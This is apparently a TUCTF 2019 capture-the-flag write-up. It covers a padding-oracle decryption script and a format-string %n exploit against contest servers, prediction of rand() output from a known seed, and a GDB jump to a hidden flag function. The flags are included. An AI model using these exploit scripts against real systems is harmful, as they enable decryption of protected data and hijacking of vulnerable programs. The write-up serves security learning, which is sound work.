# TUCTF 2019

## Crypto

### The Oracle

It's a classic Padding Oracle Attack task, which will give you an encrypted message and receive your encrypted message then tell you whether the padding is valid or not.

```python
from pwn import remote
from base64 import b64decode, b64encode

HOST, PORT = 'chal.tuctf.com', 30103

r = remote(HOST, PORT)

def pretty_print(ct):
    for bid in range(len(ct) // 16):
        print(' '.join(str(hex(ct[i]).lstrip('0x')).zfill(2) for i in range(bid * 16, (bid + 1) * 16)))

r.recvlines(6)
ct = b64decode(r.recvline().strip())
with open('ct', 'w') as f:
    f.write(b64encode(ct))
ct = [ord(i) for i in ct]
# pretty_print(ct)

def calc_pad(blk, pad):
    return [i ^ pad for i in blk]

def xor(a, b):
    return ''.join(chr(i ^ j) for i, j in zip(a, b))

pt= ''
for bid in range(len(ct) // 16 - 1):
    known_blk = [0 for _ in range(16)]

    for i in range(16):
        for j in range(256):
            r.recvlines(6)
            r.sendline('1')

            test_blk = [0] * (16 - i - 1) + [j] + calc_pad(known_blk[16 - i:16], i + 1)
            # pretty_print(test_blk)
            # assert(len(test_blk) == 16)
            payload = test_blk + ct[16 * (bid + 1):16 * (bid + 2)]
            r.sendlineafter(': ', b64encode(''.join(chr(ch) for ch in payload)))

            res = r.recvlines(2)[1]
            # print(res)
            if 'Valid' in res:
                known_blk[-(i + 1)] = j ^ (i + 1)
                break

        print('known_blk: ')
        pretty_print(known_blk)
    pt += xor(ct[16 * (bid + 0):16 * (bid + 1)], known_blk)
    print('pt = {}'.format(pt))

r.recvlines(6)
r.sendline('2')
r.sendline(pt)
r.interactive()
```

Flag `TUCTF{D0nt_l3t_y0ur_s3rv3r_g1v3_f33db4ck}`

## PWN

### printfun

Decompiled code:
```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *s; // ST1C_4
  void *buf; // ST18_4

  setvbuf(stdout, 0, 2, 0x14u);
  setvbuf(stdin, 0, 2, 0x14u);
  s = malloc(0x40u);
  buf = malloc(0x40u);
  memset(s, 0, 0x40u);
  memset(buf, 0, 0x40u);
  printf("What's the password? ");
  read(0, buf, 0x3Cu);
  getPass(s);
  puts("__DEBUG OUTPUT__ (Disable before production)");
  puts("User input:");
  printf(buf);
  sleep(1u);
  if ( !strcmp(buf, s) )
  {
    puts("Lucky guess...");
    system("/bin/cat ./flag.txt");
  }
  else
  {
    puts("Better luck next time");
  }
  return 0;
}
```

We could easily see that there is a format string vulnerability.

First, we should find the offset of `s` and `buf` on the stack frame by using `%x$s` (`x` is a number).

```python
from pwn import process

for i in range(100):
    print('# {}'.format(i + 1))
    r = process('./printfun')
    r.sendlineafter('? ', '%{}$s'.format(i + 1))
    r.recvlines(2)
    try:
        res = r.recvall().rstrip('\nBetter luck next time')
        r.close()
        print(len(res))
        print(res)
    except:
        pass
```

output:
```text
# 6
4
%6$s
# 7
60
\x95\xa4\x14F\xfe\xfe��M\x96UF\x11Ǧ\x89�#\x18X\xb7\x87\x84$\xbb�
                                                                \xaaƓ\x1c@\x17?�U\x04i
\x07�Ub)\x0b\xb7\xb6\x03y\xbe\xac\x1d7\x7f\x97\xfe
```

We knew that the offset of `s` and `buf` on the stack frame are 6 and 7, respectively.

Then, we can use `%n` to write a new value into both `s` and `buf`, making them equal, which make the program execute `system("/bin/cat ./flag.txt")`

```python
from pwn import remote

HOST, PORT = 'chal.tuctf.com', 30501

r = remote(HOST, PORT)
r.sendlineafter('? ', 'A%6$n%7$n')
r.recvlines(2)
print(r.recvall())
```

`TUCTF{wh47'5_4_pr1n7f_l1k3_y0u_d01n6_4_b1n4ry_l1k3_7h15?}`

## Misc

### RNGeesus

The task gave us a integer generated from `rand()` function, and wanted us to predict the next integer generated from `rand()`.

After some research, we found the implementation of the `rand()` function:
```cpp
static unsigned long int next = 1;

int rand(void) // RAND_MAX assumed to be 32767
{
    next = next * 1103515245 + 12345;
    return (unsigned int)(next/65536) % 32768;
}

void srand(unsigned int seed)
{
    next = seed;
}
```

Apparently, it use Linear Congruential Generator (LCG) as the algorithm to generate pseudo-randomized numbers, which uses the previous output to generate the next pseudo-random number.

Here is the exploit:

```cpp
#include <stdio.h>
#include <stdlib.h>

int main()
{
  int n;
  scanf("%d", &n);
  srand(n);
  printf("%d\n", rand());
  return 0;
}
```

Flag `TUCTF{D0NT_1NS3CUR3LY_S33D_Y0UR_LCGS}`

## Reversing

### faker

Instead of the listed options (functions), such as `A`, `B`, `C`, which will print a fake flag for us, there's still another function called `thisone` which will print the correct flag.

We could easily extract the function then execute it, or just simply use GDB to jump into the `thisone` function.

```bash
gdb-peda$ b main
gdb-peda$ r
gdb-peda$ disas thisone
Dump of assembler code for function thisone:
   0x0000561d39a3034b <+0>:	endbr64
   0x0000561d39a3034f <+4>:	push   rbp
   0x0000561d39a30350 <+5>:	mov    rbp,rsp
   0x0000561d39a30353 <+8>:	sub    rsp,0x10
   0x0000561d39a30357 <+12>:	lea    rax,[rip+0xcaa]        # 0x561d39a31008
   0x0000561d39a3035e <+19>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000561d39a30362 <+23>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000561d39a30366 <+27>:	mov    rdi,rax
   0x0000561d39a30369 <+30>:	call   0x561d39a30269 <printFlag>
   0x0000561d39a3036e <+35>:	nop
   0x0000561d39a3036f <+36>:	leave
   0x0000561d39a30370 <+37>:	ret
End of assembler dump.
gdb-peda$ set $rip=0x0000561d39a3034b
gdb-peda$ c
Continuing.
TUCTF{7h3r35_4lw4y5_m0r3_70_4_b1n4ry_7h4n_m3375_7h3_d3bu663r}
[Inferior 1 (process 60) exited with code 076]
Warning: not running
```

Flag `TUCTF{7h3r35_4lw4y5_m0r3_70_4_b1n4ry_7h4n_m3375_7h3_d3bu663r}`
